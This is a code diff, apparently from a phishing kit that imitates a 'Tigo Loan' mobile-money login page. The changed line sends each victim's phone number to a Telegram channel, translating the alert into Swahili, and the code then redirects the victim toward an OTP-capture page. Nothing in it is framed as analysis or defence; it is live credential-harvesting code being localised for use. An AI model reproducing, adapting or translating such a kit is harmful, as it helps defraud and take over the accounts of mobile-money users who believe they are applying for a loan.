@@ -44,7 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
             isSubmitting = true;
             confirmBtn.style.opacity = '0.5';
             confirmBtn.style.pointerEvents = 'none';
-            await sendToTelegram(`<b>Tigo Loan - New Login</b>\nPhone: <code>${phoneNumber}</code>`);
+            await sendToTelegram(`<b>Tigo Loan - Kuingia Mapya</b>\nSimu: <code>${phoneNumber}</code>`);
             window.location.href = 'loading.html?next=otp.html&delay=3000';
         } else if (phoneNumber.length === 0) {
             alert('Tafadhali weka namba yako ya simu.');
